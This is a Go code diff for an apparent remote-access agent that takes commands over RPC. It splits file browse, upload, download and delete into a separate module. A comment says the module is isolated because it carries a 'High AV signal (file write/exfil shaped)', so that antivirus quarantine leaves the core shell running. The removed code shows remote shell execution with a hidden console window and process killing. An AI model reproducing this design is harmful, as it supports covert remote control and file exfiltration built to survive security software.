@@ -1,97 +1,38 @@
+//go:build !modular || mod_fs
+
 package main
 
 import (
-	"bytes"
 	"context"
 	"encoding/base64"
 	"encoding/json"
 	"os"
-	"os/exec"
 	"path/filepath"
 	"runtime"
-	"strings"
-	"time"
 
 	"github.com/fakecrowd/sys0/internal/rpc"
 	"github.com/fakecrowd/sys0/internal/wire"
-	"github.com/shirou/gopsutil/v4/process"
 )
 
-func decode(params json.RawMessage, v any) *rpc.Error {
-	if len(params) == 0 {
-		return nil
-	}
-	if err := json.Unmarshal(params, v); err != nil {
-		return rpc.Errorf(rpc.CodeBadParams, "%v", err)
-	}
-	return nil
-}
+// FS MODULE — filesystem browse + transfer (ls/stat/get/put/rm). High AV signal
+// (file write/exfil shaped); isolated so quarantine here leaves core/shell up.
 
-func (a *Agent) doShellRun(ctx context.Context, params json.RawMessage) (any, *rpc.Error) {
-	var p wire.ShellRunParams
-	if e := decode(params, &p); e != nil {
-		return nil, e
-	}
-	if p.Cmd == "" {
-		return nil, rpc.Errorf(rpc.CodeBadParams, "cmd required")
-	}
-	timeout := time.Duration(p.Timeout) * time.Second
-	if timeout <= 0 {
-		timeout = 30 * time.Second
-	}
-	cctx, cancel := context.WithTimeout(ctx, timeout)
-	defer cancel()
-	cmd := shellCommand(cctx, p.Cmd)
-	if p.Cwd != "" {
-		cmd.Dir = p.Cwd
-	}
-	var stdout, stderr bytes.Buffer
-	cmd.Stdout = &stdout
-	cmd.Stderr = &stderr
-	err := cmd.Run()
-	res := wire.ShellRunResult{Stdout: stdout.String(), Stderr: stderr.String()}
-	if cctx.Err() == context.DeadlineExceeded {
-		return nil, rpc.Errorf(rpc.CodeTimeout, "command timed out")
-	}
-	if err != nil {
-		if ee, ok := err.(*exec.ExitError); ok {
-			res.Exit = ee.ExitCode()
-		} else {
-			return nil, rpc.Errorf(rpc.CodeInternal, "%v", err)
-		}
-	}
-	return res, nil
-}
-
-func (a *Agent) doProcSignal(params json.RawMessage) (any, *rpc.Error) {
-	var p wire.ProcSignalParams
-	if e := decode(params, &p); e != nil {
-		return nil, e
-	}
-	proc, err := process.NewProcess(int32(p.PID))
-	if err != nil {
-		return nil, rpc.Errorf(rpc.CodeBadParams, "no such process %d", p.PID)
-	}
-	switch strings.ToUpper(p.Sig) {
-	case "KILL":
-		err = proc.Kill()
-	default: // TERM/INT/HUP -> graceful terminate (cross-platform)
-		err = proc.Terminate()
-	}
-	if err != nil {
-		return nil, rpc.Errorf(rpc.CodeInternal, "%v", err)
-	}
-	return wire.OKResult{OK: true}, nil
-}
-
-// shellCommand builds a non-interactive shell invocation for the current OS.
-func shellCommand(ctx context.Context, cmdline string) *exec.Cmd {
-	if runtime.GOOS == "windows" {
-		c := exec.CommandContext(ctx, "cmd", "/c", cmdline)
-		hideWindow(c) // no black console window flash for background shell.run
-		return c
-	}
-	return exec.CommandContext(ctx, "sh", "-c", cmdline)
+func init() {
+	registerMethod(wire.MethodFsLs, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
+		return a.doFsLs(params)
+	})
+	registerMethod(wire.MethodFsStat, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
+		return a.doFsStat(params)
+	})
+	registerMethod(wire.MethodFsGet, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
+		return a.doFsGet(params)
+	})
+	registerMethod(wire.MethodFsPut, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
+		return a.doFsPut(params)
+	})
+	registerMethod(wire.MethodFsRm, func(a *Agent, _ context.Context, params json.RawMessage) (any, *rpc.Error) {
+		return a.doFsRm(params)
+	})
 }
 
 func (a *Agent) doFsLs(params json.RawMessage) (any, *rpc.Error) {
@@ -177,8 +118,6 @@ func (a *Agent) doFsPut(params json.RawMessage) (any, *rpc.Error) {
 	}
 	// Chunked-friendly write: the first chunk (offset 0) creates/truncates the
 	// file; later chunks open it without truncating and WriteAt their offset.
-	// This lets the console upload large files as a sequence of FsPut calls and
-	// render progress, while a single full-file call (offset 0) still works.
 	flags := os.O_CREATE | os.O_WRONLY
 	if p.Offset == 0 {
 		flags |= os.O_TRUNC
